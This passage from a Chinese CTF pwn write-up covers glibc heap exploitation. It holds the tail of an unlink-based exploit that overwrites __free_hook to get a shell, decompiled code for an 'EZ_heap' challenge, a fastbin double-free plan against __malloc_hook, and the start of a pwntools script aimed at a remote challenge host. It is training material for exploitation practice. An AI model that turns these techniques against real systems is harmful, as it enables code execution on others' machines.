        sla(p,"please chooice :\n","2")
        sla(p,"which node do you want to delete\n",str(index))
    def show(index):
        sla(p,"please chooice :\n","3")
        sla(p,"which node do you want to show\n",str(index))
    def take(index,content):
        sla(p,"please chooice :\n","4")
        sla(p,"which one do you want modify :\n",str(index))
        sda(p,"please input the content\n",content)
    touch(0x80)#0
    touch(0x80)#1，chunk1的作用是防止chunk0在free的时候跟top chunk合并
    delete(0)
    touch(0x80)#2 = 0
    take(0,"\xff"*8)
    show(0)
    leak = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    malloc_hook = leak-0x58-0x10
    libc_base = malloc_hook - libc.symbols["__malloc_hook"]
    one = libc_base+0x4526a
    free = libc_base+libc.symbols["__free_hook"]
    system = libc_base+libc.symbols["system"]
    print "malloc_hook--->",hex(malloc_hook)
    print "libc_base--->",hex(libc_base)
    delete(1)
    delete(0)
    bss = 0x6020c0
    fd = bss-3*8
    bk = fd+8
    #debug()
    touch(0x80)#0
    take(0,"a"*0x80)
    touch(0x80)#1  
    take(1,"b"*0x80)
    touch(0x80)#2
    take(2,"c"*0x80)
    payload = p64(0)+p64(0x81)+p64(fd)+p64(bk)+"a"*0x60
    payload += p64(0x80)+p64(0x90)
    take(0,payload)
    delete(1)
    take(0,p64(0)*3+p64(free))
    take(0,p64(one))
    take(2,"/bin/sh\x00")
    delete(2)
    getshell()
有关堆的一些入门的学习链接：
[CTF pwn 中最通俗易懂的堆入坑指南](https://www.anquanke.com/post/id/163971#h3-5)
[how2heap](https://www.anquanke.com/post/id/86808)
[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction/)
[Linux堆内存管理深入分析](https://introspelliam.github.io/2017/09/10/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/)
[Dance In Heap](https://www.freebuf.com/articles/system/151372.html)
# EZ_heap
这题其实见过几次了，hitcon-training的lab12，网鼎杯半决赛线下赛的pwn3，程序逻辑都是一毛一样的，只是题目描述在变而已，也算经典题了吧
主要利用了double free的漏洞
来看一下这个保护机制：还是只开了nx和canary
    Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
IDA分析：仍然是一个堆题特色的菜单功能
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char buf; // [rsp+10h] [rbp-20h]
      unsigned __int64 v4; // [rsp+28h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      init();
      while ( 1 )
      {
        menu();
        read(0, &buf, 8uLL);
        switch ( atoi(&buf) )
        {
          case 1:
            add();
            break;
          case 2:
            check();
            break;
          case 3:
            del();
            break;
          case 4:
            clean();
            break;
          case 5:
            puts("BaiBai~");
            exit(0);
            return;
          default:
            puts("Invalid choice");
            break;
        }
      }
    }
主要有四个功能函数
add函数，用来创建chunk，一进入该函数就先创建了一个大小为0x28的chunk
我们给他命名为chunk_init
接着再由用户指定的size创建chunk
chunk_init[0]存放了一个标记数，用0和1表示用户的申请的chunk的状态，如果是free状态则为0
chunk_init[1]存放了用户申请的chunk的指针
chunk_init[2]存放了一段字符串
    int add()
    {
      void *v0; // rsi
      size_t size; // [rsp+0h] [rbp-20h]
      void *s; // [rsp+8h] [rbp-18h]
      void *buf; // [rsp+10h] [rbp-10h]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      s = 0LL;
      buf = 0LL;
      LODWORD(size) = 0;
      if ( animalcount > 0x63 )
        return puts("The cage is overflow");
      s = malloc(0x28uLL);
      memset(s, 0, 0x28uLL);
      printf("Length of the name :", 0LL, size);
      if ( __isoc99_scanf("%u", &size) == -1 )
        exit(-1);
      buf = malloc(size);
      if ( !buf )
      {
        puts("Alloca error !!");
        exit(-1);
      }
      printf("The name of animal :", &size, size);
      v0 = buf;
      read(0, buf, size);
      *(s + 1) = buf;
      printf("The kind of the animal :", v0, size);
      __isoc99_scanf("%23s", s + 16);
      *s = 1;                                       // chunk：s
                                                    // s[0]--->1
                                                    // s[1]--->buf
                                                    // s[2]--->kind_of_animal
                                                    // 
      for ( HIDWORD(size) = 0; HIDWORD(size) <= 0x63; ++HIDWORD(size) )
      {
        if ( !*(&animallist + HIDWORD(size)) )
        {
          *(&animallist + HIDWORD(size)) = s;
          break;
        }
      }
      ++animalcount;
      return puts("Successful !");
    }
check函数的功能就是输出各个chunk的内容了，直接遍历animallist，也就是存放各个chunk_init指针的一个数组
如果chunk_init指针非空并且chunk_init[0]也就是那个标记数也非空，则打印出chunk_init[1]也就是用户申请的chunk的内容
    int check()
    {
      __int64 v0; // rax
      unsigned int i; // [rsp+Ch] [rbp-4h]
      LODWORD(v0) = animalcount;
      if ( animalcount )
      {
        for ( i = 0; i <= 0x63; ++i )
        {
          v0 = *(&animallist + i);
          if ( v0 )
          {
            LODWORD(v0) = **(&animallist + i);
            if ( v0 )
            {
              printf("Name of the animal[%u] :%s\n", i, *(*(&animallist + i) + 1));
              LODWORD(v0) = printf("Kind of the animal[%u] :%s\n", i, *(&animallist + i) + 16);
            }
          }
        }
      }
      else
      {
        LODWORD(v0) = puts("No animal in the cage !");
      }
      return v0;
    }
del函数是将用户申请的chunk给free掉，并且将chunk_init[0]的内容修改成0，表示已被删除
    int del()
    {
      int result; // eax
      unsigned int v1; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      if ( !animalcount )
        return puts("No animal in the cage");
      printf("Which animal do you want to remove from the cage:");
      __isoc99_scanf("%d", &v1);
      if ( v1 <= 0x63 && *(&animallist + v1) )
      {
        **(&animallist + v1) = 0;
        free(*(*(&animallist + v1) + 1));
        result = puts("Successful");
      }
      else
      {
        puts("Invalid choice");
        result = 0;
      }
      return result;
    }
而clean函数则是将chunk_init给free掉并且在animallist中把相应的指针清空
需要注意的是，必须先执行了del函数，clean函数才能发挥作用，因为有个对chunk_init[0]标志数的检验，只有为0的时候才会执行下面的free操作
    int clean()
    {
      unsigned int i; // [rsp+Ch] [rbp-4h]
      for ( i = 0; i <= 0x63; ++i )
      {
        if ( *(&animallist + i) && !**(&animallist + i) )
        {
          free(*(&animallist + i));
          *(&animallist + i) = 0LL;
          --animalcount;
        }
      }
      return puts("Done!");
    }
理清楚上面各个函数的逻辑后，就可以开始着手做题了
解题的思路如下：
  * 首先通过unsorted_bin，free掉一个chunk，让它进入unsorted_bin表，使得fd指向表头，然后通过泄漏出的地址，通过一顿偏移的操作，泄漏出malloc_hook的地址，进而泄漏出libc的基址
  * 利用double-free，使得下一个新创建的chunk会落在malloc_hook上，改变新chunk的内容也就是改变了malloc_hook的内容
  * 同时free一个chunk两次，就会触发malloc_printer报错，接着也会调用mallo_hook，如果了malloc_hook的内容为[onegadget](https://github.com/david942j/one_gadget)，在报错过程中就会改变程序执行流程进而去执行onegadget，getshell
ps：这里需要注意的是，在构造double-free的时候，需要注意绕过他的检验，使得fd+0x08指向的数值是0x70~0x7f的，fd指向pre_size位，fd+0x08则指向了size位。具体原理可见：
[fastbin-double-free](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/#fastbin-double-free)
这题的wp还可以参考hitcon-training的lab12，网上很大佬都写过
exp
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./supwn6"
    context.binary=bin_elf
    libc = ELF("./libc64.so")
    #libc = elf.libc
    elf = ELF(bin_elf)
    if sys.argv[1] == "r":
        p = remote("43.254.3.203",10006)
    elif sys.argv[1] == "l":
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0: